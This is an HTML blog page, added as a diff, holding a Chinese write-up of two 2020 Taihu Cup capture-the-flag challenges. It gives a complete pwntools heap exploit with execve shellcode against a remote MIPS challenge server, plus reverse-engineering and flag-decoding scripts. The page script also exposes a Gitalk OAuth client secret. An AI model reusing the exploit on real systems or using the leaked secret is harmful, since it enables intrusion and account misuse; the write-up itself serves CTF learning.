@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Sivona">
+
+
+
+
+
+<title>2020太湖杯wp | Sivona&#39;s</title>
+
+
+
+    <link rel="icon" href="/bug.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Sivona&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Sivona&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">2020太湖杯wp</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Sivona</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 8, 2020&nbsp;&nbsp;15:55:51</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/writeup/">writeup</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="easyKooc"><a href="#easyKooc" class="headerlink" title="easyKooc"></a>easyKooc</h2><p>本来是一个很简单的mips pwn，分配一个chunk到栈上然后ret2shellcode。一开始没找到合适的shellcode因为我一直觉得shellcode的长度要小于0x38。。。</p>
+<p>于是我就妄想rop来getshell，导致浪费了很多时间，这题做完比赛都差不多要结束了。。。</p>
+<p>贴一下exp，主要记录一下我这个还算比较短的shellcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.binary = <span class="string">'./easyKooc'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([<span class="string">'qemu-mipsel'</span>,<span class="string">'-L'</span>,<span class="string">'./mipsel-linux-gnu'</span>,<span class="string">'-g'</span>,<span class="string">'1234'</span>,<span class="string">'./easyKooc'</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"121.36.166.138"</span>,<span class="number">8889</span>)</span><br><span class="line">    <span class="comment">#p = process(['qemu-mipsel','-L','./mipsel-linux-gnu','./easyKooc'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"id!\n"</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"content\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice\n"</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"id!\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice\n"</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">"leave?\n"</span>,content)</span><br><span class="line">code = <span class="string">"\xff\xff\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xf4\xff\xaf\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf8\xff\xae\xaf\xfc\xff\xa0\xaf\xf4\xff\xa4\x27\xff\xff\x05\x28\xab\x0f\x02\x24\x0c\x01\x01\x01"</span></span><br><span class="line">p.sendafter(<span class="string">"motto!\n"</span>,code)</span><br><span class="line">p.recvuntil(<span class="string">"you: "</span>)</span><br><span class="line">leak = int(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">info(<span class="string">"stack:"</span>+hex(leak))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'aaaaaaa'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'bbbbbbb'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,p64(leak+<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">edit(<span class="string">'h'</span>*<span class="number">0x21</span>)</span><br><span class="line">p.recvuntil(<span class="string">"is "</span>+<span class="string">'h'</span>*<span class="number">0x21</span>)</span><br><span class="line">canary = u32(p.recv(<span class="number">3</span>).rjust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">info(<span class="string">"canary:"</span>+hex(canary))</span><br><span class="line">edit((p32(<span class="number">0</span>)+p32(<span class="number">0x41</span>))*<span class="number">4</span>+p32(canary))</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'gggg'</span>)</span><br><span class="line">add(<span class="number">6</span>,p32(canary)+<span class="string">'a'</span>*<span class="number">4</span>+p32(<span class="number">0x413008</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"choice\n"</span>,<span class="string">'4'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="baby-arm"><a href="#baby-arm" class="headerlink" title="baby_arm"></a>baby_arm</h2><p>用ida打开是反汇编不出主函数的，ghidra确可以。主要是因为作者在代码段中插入了一些奇怪的字节，比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0001094c 02 df df f5     ldrb       sp,[DAT_00011856]</span><br><span class="line">00010950 00 00 a0 e1     cpy        r0,r0</span><br><span class="line">00010954 00 00 a0 e1     cpy        r0,r0</span><br></pre></td></tr></table></figure>
+<p>这也是程序没办法直接跑起来的原因</p>
+<p>观察了一下这句指令应该没什么用，于是就改成和下面一样的cpy r0,r0(nop,mov r0,r0)。用idapython批量跑一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x1040C</span></span><br><span class="line">end = <span class="number">0x10D18</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">"\x02\xdf\xdf\xf5"</span></span><br><span class="line">b = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xa0</span>,<span class="number">0xe1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,end-start,<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">if</span> a == get_bytes(start+i,<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            patch_byte(start+i+j,b[j])</span><br></pre></td></tr></table></figure>
+<p>然后ida就可以正常看伪代码了(ghidra用起来还是不太习惯</p>
+<h3 id="主要逻辑"><a href="#主要逻辑" class="headerlink" title="主要逻辑"></a>主要逻辑</h3><p>程序有两段check</p>
+<ul>
+<li><p>前13个字节会用mmap出来的三段代码进行加密 分别是+ - ^</p>
+</li>
+<li><p>后12个字节是一个迷宫然后异或</p>
+</li>
+</ul>
+<h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">  v7 = 0x4FFED263;</span></span><br><span class="line"><span class="string">  v8 = 0x3F00D9B9;</span></span><br><span class="line"><span class="string">  v9 = 0x504380A0;</span></span><br><span class="line"><span class="string">  v10 = 0x55</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  0xFD, 0x9A, 0x9F, 0xE8, 0xC2, 0xAE, 0x9B, 0x2D, 0xC3, 0x11, </span></span><br><span class="line"><span class="string">  0x2A, 0x35, 0xF6, 0x00, 0x00, 0x00  </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x63</span>,<span class="number">0xd2</span>,<span class="number">0xfe</span>,<span class="number">0x4f</span>,<span class="number">0xb9</span>,<span class="number">0xd9</span>,<span class="number">0x00</span>,<span class="number">0x3f</span>,<span class="number">0xa0</span>,<span class="number">0x80</span>,<span class="number">0x43</span>,<span class="number">0x50</span>,<span class="number">0x55</span>]</span><br><span class="line">b = [<span class="number">0xFD</span>, <span class="number">0x9A</span>, <span class="number">0x9F</span>, <span class="number">0xE8</span>, <span class="number">0xC2</span>, <span class="number">0xAE</span>, <span class="number">0x9B</span>, <span class="number">0x2D</span>, <span class="number">0xC3</span>, <span class="number">0x11</span>, <span class="number">0x2A</span>, <span class="number">0x35</span>, <span class="number">0xF6</span>]</span><br><span class="line"></span><br><span class="line">idx = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(idx&lt;<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> permutations(string.printable,<span class="number">1</span>):</span><br><span class="line">        i = i[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> idx%<span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> (ord(i)+b[idx])&amp;<span class="number">0xff</span> == a[idx]:</span><br><span class="line">                print(i,end=<span class="string">''</span>)</span><br><span class="line">        <span class="keyword">elif</span> idx%<span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> (ord(i)-b[idx])&amp;<span class="number">0xff</span> == a[idx]:</span><br><span class="line">                print(i,end=<span class="string">''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> (ord(i)^b[idx])&amp;<span class="number">0xff</span> == a[idx]:</span><br><span class="line">                print(i,end=<span class="string">''</span>)</span><br><span class="line">    idx += <span class="number">1</span></span><br><span class="line">print()</span><br><span class="line">a = [  <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x3A</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, </span><br><span class="line">  <span class="number">0x55</span>, <span class="number">0x3A</span>, <span class="number">0x54</span>, <span class="number">0x40</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x3A</span>, <span class="number">0x30</span>, </span><br><span class="line">  <span class="number">0x3A</span>, <span class="number">0x3A</span>, <span class="number">0x3A</span>, <span class="number">0x3A</span>, <span class="number">0x54</span>, <span class="number">0x40</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, </span><br><span class="line">  <span class="number">0x3A</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x3A</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, </span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0x54</span>, <span class="number">0x3A</span>, <span class="number">0x3A</span>, <span class="number">0x3A</span>, <span class="number">0x3A</span>, <span class="number">0x30</span>, <span class="number">0x3A</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, </span><br><span class="line">  <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x88</span>, <span class="number">0x54</span>, <span class="number">0x3A</span>, <span class="number">0x3A</span>, <span class="number">0x3A</span>, <span class="number">0x3A</span>, <span class="number">0x3A</span>, <span class="number">0x3A</span>]</span><br><span class="line">idx= <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> idx&lt;<span class="number">6</span>:</span><br><span class="line">        print(chr(i&gt;&gt;<span class="number">1</span>),end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(chr(i^<span class="number">0x10</span>),end=<span class="string">''</span>)</span><br><span class="line">    idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">6</span> <span class="keyword">or</span> idx == <span class="number">12</span>:</span><br><span class="line">        print()</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">12</span>:</span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line"><span class="comment">#aaassssdddsss</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">  v4 = 0x41203E53;</span></span><br><span class="line"><span class="string">  v5 = 0xB242C1E;</span></span><br><span class="line"><span class="string">  v6 = 0x52372836;</span></span><br><span class="line"><span class="string">  v7 = 0xE;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">a = [<span class="number">0x53</span>,<span class="number">0x3e</span>,<span class="number">0x20</span>,<span class="number">0x41</span>,<span class="number">0x1e</span>,<span class="number">0x2c</span>,<span class="number">0x24</span>,<span class="number">0x0b</span>,<span class="number">0x36</span>,<span class="number">0x28</span>,<span class="number">0x37</span>,<span class="number">0x52</span>,<span class="number">0x0e</span>]</span><br><span class="line">b = <span class="string">"aaassssdddsss"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    print(chr(ord(b[i])^a[i]),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+
+<p>还有两个pwn看心情复现一下</p>
+
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"787cc455593c1fb9cfcd","clientSecret":"f6abba3d9cc77878426ee16aa8bcb980fd3cd70c","repo":"s1vona.github.io","owner":"s1vona","admin":["s1vona"],"distractionFreeMode":true};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Sivona</span>
+                    </p>
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Enforce justice on behalf of Heaven.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E5%A4%AA%E6%B9%96%E6%9D%AF/"># 太湖杯</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp-pwn/">2020西湖论剑wp-pwn</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Sivona | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+    <div>
+        友情链接: 
+       <div>
+        <a class="theme-link"  href="https://sncker.github.io" target="_blank" rel="noopener"> SNCKER's blog </a><span>&nbsp;&nbsp;</span>
+        <a class="theme-link"  href="https://www.cnblogs.com/lnjoy/" target="_blank" rel="noopener"> EnJoy_July 's blog' </a><span>&nbsp;&nbsp;</span>
+       </div>
+       
+      </div>
+</footer>
+
+    </div>
+</body>
+</html>
